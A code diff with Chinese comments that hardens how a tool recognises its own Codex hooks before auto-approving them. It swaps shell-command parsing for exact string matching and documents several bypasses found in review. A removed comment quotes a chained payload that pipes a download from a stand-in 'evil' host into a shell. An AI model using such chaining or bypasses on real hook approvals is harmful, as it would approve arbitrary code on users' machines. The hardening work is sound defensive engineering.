@@ -114,46 +114,8 @@ function trustStateOf(table: Record<string, unknown> | null, key: string): {
  * `"/opt/x/party"\u00A0hook codex-stop` 判成 binary=/opt/x/party + args=[hook, codex-stop]
  * ⇒ 自动批准；shell 实际执行的却是 `/opt/x/party\u00A0hook`——另一个可执行文件。
  */
-const SHELL_SEP = /[ \t]/;
-const SHELL_SEPS = /[ \t]+/;
-/** 只吃 shell 分隔符的 trim；不能用 String.trim()（它同样会吃掉 NBSP 之类）。 */
-function shellTrim(text: string): string {
-  return text.replace(/^[ \t\n]+/, "").replace(/[ \t\n]+$/, "");
-}
 
-/** 命令行首个 token（去掉包裹的引号），用来判定可执行文件本体。 */
-function commandBinary(command: string): string | null {
-  const trimmed = shellTrim(command);
-  if (trimmed === "") return null;
-  const quote = trimmed[0];
-  if (quote === '"' || quote === "'") {
-    const end = trimmed.indexOf(quote, 1);
-    if (end === -1) return null;
-    // 闭合引号后**必须**是空白或结尾。少了这一条，`"/opt/x/party"hook codex-stop` 会被解析成
-    // binary=/opt/x/party + args=[hook, codex-stop]，三项判据全过 ⇒ 自动批准；而 shell 实际
-    // 执行的是 `/opt/x/partyhook`——另一个可执行文件。引号只是引号，不是 token 边界。
-    const after = trimmed[end + 1];
-    if (after !== undefined && !SHELL_SEP.test(after)) return null;
-    return trimmed.slice(1, end);
-  }
-  const space = trimmed.search(SHELL_SEP);
-  return space === -1 ? trimmed : trimmed.slice(0, space);
-}
 
-/** 首个 token 之后的参数（粗切，够判 `hook <sub>` 这两段即可）。 */
-function commandArgs(command: string): string[] {
-  const trimmed = shellTrim(command);
-  const quote = trimmed[0];
-  let rest: string;
-  if (quote === '"' || quote === "'") {
-    const end = trimmed.indexOf(quote, 1);
-    rest = end === -1 ? "" : trimmed.slice(end + 1);
-  } else {
-    const space = trimmed.search(SHELL_SEP);
-    rest = space === -1 ? "" : trimmed.slice(space);
-  }
-  return shellTrim(rest).split(SHELL_SEPS).filter((t) => t !== "");
-}
 
 /**
  * 这条 hook 是不是**我们自己装的**。
@@ -166,39 +128,52 @@ function commandArgs(command: string): string[] {
  * 因此要求三件事同时成立：可执行文件 basename 是 party、第一个参数是 `hook`、第二个是
  * 我们的子命令。判不准一律不认（返回 null），漏认只是少批准一条，误认是安全事故。
  */
+/**
+ * 这条 hook 是不是**我们自己装的**。
+ *
+ * 判据是**与安装器会写出的那串精确相等**，一行词法分析都不做。
+ *
+ * 为什么不是"解析命令再校验"：本模块的后果是把命中的条目自动标成 `enabled = true`，
+ * 也就是**替用户批准一条 hook**。而"解析 shell 命令"在字符串层面永远只是近似 ——
+ * 这段判据被对抗审查连着找到五层绕过（纯子串 → 只校验前缀 → 引号后没校验 token 边界 →
+ * `\s` 把 NBSP 当分隔符 → 换行当成参数分隔符），每一层都是在上一层"修好了"之后。
+ * 攻击面在词法层，而白名单仍然在字符串层，换个写法就能再绕一次。
+ *
+ * 但我们不需要解析：**这串命令本来就是我们自己写进去的**（`codexHookSettingsJson`）。
+ * 于是归属判定退化成相等比较 —— 候选集有限、可枚举、无歧义，绕过面为零。
+ *
+ * 代价（有意接受）：用户手改过命令（加 flag、换包装）之后我们**不再认它**，
+ * 于是不自动批准、退到"把要粘的 TOML 打出来"那条兜底。**漏认只是少批准一条，
+ * 误认是替用户批准了别人的 hook** —— 这个方向的不对称是刻意的。
+ */
 export function classifyOwnHookCommand(
   command: string,
+  execPath: string = process.execPath,
 ): (typeof CODEX_OWN_HOOK_COMMANDS)[number] | undefined {
-  // 换行/回车在 shell 里是**命令分隔符**，不是参数分隔符。把它当空白会漏掉这种形态：
-  //
-  //     "/opt/x/party"
-  //     hook codex-stop
-  //
-  // 实际执行的是**两条命令**——`party`（无参数）和 `hook codex-stop`（一个叫 hook 的程序），
-  // 而按空白切会解析成 binary=party + args=[hook, codex-stop]，三项判据全过 ⇒ 自动批准。
-  // 我们自己装的命令一律是单行；含换行即判不可解析、不认。
-  if (/[\n\r]/.test(shellTrim(command))) return undefined;
-  const binary = commandBinary(command);
-  if (binary === null) return undefined;
-  const base = binary.split("/").pop() ?? binary;
-  if (base.replace(/\.(exe|cmd|bat)$/i, "") !== "party") return undefined;
-  const args = commandArgs(command);
-  // **恰好**两个参数。只校验前缀是不够的：`party hook codex-stop && curl evil | sh` 的
-  // basename / args[0] / args[1] 全都对得上，于是整条命令（含后面那段载荷）会被我们
-  // 自动标成 trusted——等于替用户批准了一段任意 shell。多出来的 token 无论是 `&&`、`;`、
-  // 管道还是换行接的第二条命令，都会让长度超过 2，这一刀全部堵掉。
-  //
-  // 刻意只留这一道闸，不再并排加一个「含 shell 元字符就拒」的判据：两道互相兜底的闸会让
-  // 变异测试假阴性（去掉其中一道，反向用例照样绿，#884/#934 的教训）。长度判定是唯一
-  // 决定结果的那一步。
-  if (args.length !== 2 || args[0] !== "hook") return undefined;
-  return CODEX_OWN_HOOK_COMMANDS.find((c) => c.sub === args[1]);
+  return CODEX_OWN_HOOK_COMMANDS.find((c) =>
+    expectedHookCommands(c.sub, execPath).includes(command),
+  );
+}
+
+/**
+ * 安装器对某个子命令会写出的全部合法形态。
+ *
+ * 与 `codexHookSettingsJson` 同源：`${bin} hook codex-<sub>`，其中 bin 要么是裸 `party`
+ * （不是 party 二进制在跑时的回落），要么是 JSON 引号包起来的绝对路径。这里把两种都列出来，
+ * 并额外容忍"当前 execPath 与安装时不同"（用户升级过、或换了安装位置）——那种情况下
+ * 命令里是**安装当时**的路径，我们认不出来，只能走兜底，这是可接受的。
+ */
+function expectedHookCommands(sub: string, execPath: string): string[] {
+  const out = [`party hook ${sub}`];
+  if (execPath !== "") out.push(`${JSON.stringify(execPath)} hook ${sub}`);
+  return out;
 }
 
 export function findCodexOwnHooks(
   hooksPath: string,
   hooksJson: unknown,
   config: unknown,
+  execPath: string = process.execPath,
 ): CodexHookTarget[] {
   const out: CodexHookTarget[] = [];
   const hooks = asObject(asObject(hooksJson)?.hooks ?? null);
@@ -212,7 +187,7 @@ export function findCodexOwnHooks(
       for (let h = 0; h < entries.length; h += 1) {
         const command = asObject(entries[h])?.command;
         if (typeof command !== "string") continue;
-        const own = classifyOwnHookCommand(command);
+        const own = classifyOwnHookCommand(command, execPath);
         if (own === undefined) continue;
         const key = `${hooksPath}:${trustEventName(event)}:${String(g)}:${String(h)}`;
         out.push({
@@ -438,8 +413,10 @@ export function buildCodexTrustRemedy(input: {
   hooksJson: unknown;
   config: unknown;
   detail?: string;
+  /** 安装时那个 party 路径（归属判定按「与安装器写出的那串相等」比对）。测试用。 */
+  execPath?: string;
 }): CodexTrustRemedy {
-  const targets = findCodexOwnHooks(input.hooksPath, input.hooksJson, input.config);
+  const targets = findCodexOwnHooks(input.hooksPath, input.hooksJson, input.config, input.execPath);
   return {
     hooksPath: input.hooksPath,
     configPath: input.configPath,
